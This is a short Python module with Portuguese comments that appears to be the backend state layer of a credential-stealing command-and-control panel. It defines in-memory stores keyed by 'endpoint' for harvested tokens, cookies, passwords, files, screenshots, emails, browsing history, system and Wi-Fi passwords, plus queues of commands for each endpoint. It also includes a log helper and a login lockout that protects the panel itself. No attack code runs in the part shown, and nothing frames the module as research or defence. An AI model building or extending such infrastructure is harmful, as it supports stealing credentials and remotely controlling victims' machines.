import datetime

# Memória do Sistema (RAM-based para evitar dependências de BD)
endpoints = {}
metrics_data = []
endpoint_tokens = {}
endpoint_cookies = {}
endpoint_passwords = {}
endpoint_files = {}
endpoint_screenshots = {}
endpoint_emails = {}
endpoint_history = {}
endpoint_system_passwords = {}
endpoint_wifi_passwords = {}
endpoint_system_info = {}
full_reports = {}
system_logs = []
failed_logins = {} # IP -> {'count': int, 'ban_until': datetime}
command_queues = {} # Endpoint -> list of commands

def add_log(level, source, message):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = {
        'id': len(system_logs) + 1,
        'timestamp': timestamp,
        'level': level,
        'source': source,
        'message': message
    }
    system_logs.insert(0, log_entry)  # Mais recentes primeiro
    if len(system_logs) > 500:
        system_logs.pop() # Limite de 500 para evitar peso na RAM
    print(f"[{level}] [{source}] {message}")

def record_failure(ip):
    now = datetime.datetime.now()
    if ip not in failed_logins:
        failed_logins[ip] = {'count': 0, 'ban_until': None}
    
    # Se já está banido, ignora a contagem nova
    if failed_logins[ip]['ban_until'] and now < failed_logins[ip]['ban_until']:
        return True
        
    failed_logins[ip]['count'] += 1
    if failed_logins[ip]['count'] >= 3:
        failed_logins[ip]['ban_until'] = now + datetime.timedelta(minutes=10)
        add_log('SECURITY', 'FAIL2BAN', f"IP {ip} bloqueado automaticamente por múltiplos erros de senha.")
        return True
    return False

def is_banned(ip):
    if ip in failed_logins and failed_logins[ip]['ban_until']:
        if datetime.datetime.now() < failed_logins[ip]['ban_until']:
            return True
        else:
            failed_logins[ip]['count'] = 0
            failed_logins[ip]['ban_until'] = None
    return False
